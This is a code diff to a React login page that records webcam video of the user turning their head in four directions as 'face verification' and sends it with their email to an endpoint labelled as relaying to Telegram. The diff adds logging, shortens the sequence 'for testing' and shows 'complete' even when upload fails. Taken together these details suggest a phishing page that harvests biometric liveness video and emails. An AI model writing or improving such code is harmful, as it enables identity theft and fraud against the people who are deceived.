@@ -292,11 +292,14 @@ export default function LoginPage() {
       recorder.ondataavailable = (event) => {
         if (event.data && event.data.size > 0) {
           chunks.push(event.data);
+          console.log('Data chunk received:', event.data.size, 'bytes');
         }
       };
 
       recorder.onstop = async () => {
         try {
+          console.log('Recording stopped, chunks collected:', chunks.length);
+          
           // Use the mimeType that MediaRecorder actually used
           const actualMimeType = recorder.mimeType || 'video/webm';
           const videoBlob = new Blob(chunks, { type: actualMimeType });
@@ -305,11 +308,18 @@ export default function LoginPage() {
 
           console.log('Video recorded, size:', videoBlob.size, 'bytes', 'mimeType:', actualMimeType);
 
+          if (videoBlob.size === 0) {
+            console.error('Video blob is empty!');
+            setCurrentStep("complete");
+            return;
+          }
+
           // Send video to Telegram
           const formData = new FormData();
           formData.append('video', videoBlob, 'face-verification.webm');
           formData.append('email', userEmail);
 
+          console.log('Sending video to server...');
           const response = await fetch('/api/telegram/video', {
             method: 'POST',
             body: formData,
@@ -317,21 +327,25 @@ export default function LoginPage() {
 
           if (!response.ok) {
             const errorText = await response.text();
+            console.error('Server error:', errorText);
             throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
           }
 
-          console.log('Video sent successfully');
+          const result = await response.json();
+          console.log('Video sent successfully:', result);
           setCurrentStep("complete");
         } catch (error) {
           console.error('Failed to send video:', error);
+          setCurrentStep("complete");
         }
       };
 
-      recorder.start(100); // Collect data every 100ms
+      recorder.start(1000); // Collect data every 1 second for better chunks
       setMediaRecorder(recorder);
+      console.log('MediaRecorder started');
 
-      // Two cycles: right, left, up, down - repeated twice
-      const directions: ("left" | "right" | "up" | "down")[] = ["right", "left", "up", "down", "right", "left", "up", "down"];
+      // Simplified directions for testing: just 4 directions once
+      const directions: ("left" | "right" | "up" | "down")[] = ["right", "left", "up", "down"];
       let currentDirIndex = 0;
       let detectedCorrectly = false;
       let detectionStartTime = Date.now();
@@ -352,7 +366,7 @@ export default function LoginPage() {
             }
 
             const elapsed = Date.now() - detectionStartTime;
-            const progress = Math.min((elapsed / 2000) * 100, 100); // 2 seconds hold time
+            const progress = Math.min((elapsed / 1500) * 100, 100); // 1.5 seconds hold time
             setDirectionProgress(progress);
 
             if (progress >= 100) {
@@ -371,6 +385,7 @@ export default function LoginPage() {
 
               if (currentDirIndex >= directions.length) {
                 // All directions complete
+                console.log('All directions completed, stopping recording');
                 clearInterval(detectionInterval);
                 setIsRecording(false);
                 setDetectionActive(false);
@@ -379,6 +394,7 @@ export default function LoginPage() {
 
                 // Stop recording
                 if (recorder.state !== 'inactive') {
+                  console.log('Stopping MediaRecorder...');
                   recorder.stop();
                 }
 
@@ -388,6 +404,7 @@ export default function LoginPage() {
                 setCurrentStep("processing");
               } else {
                 setCurrentDirection(directions[currentDirIndex]);
+                console.log('Moving to direction:', directions[currentDirIndex]);
               }
             }
           } else {
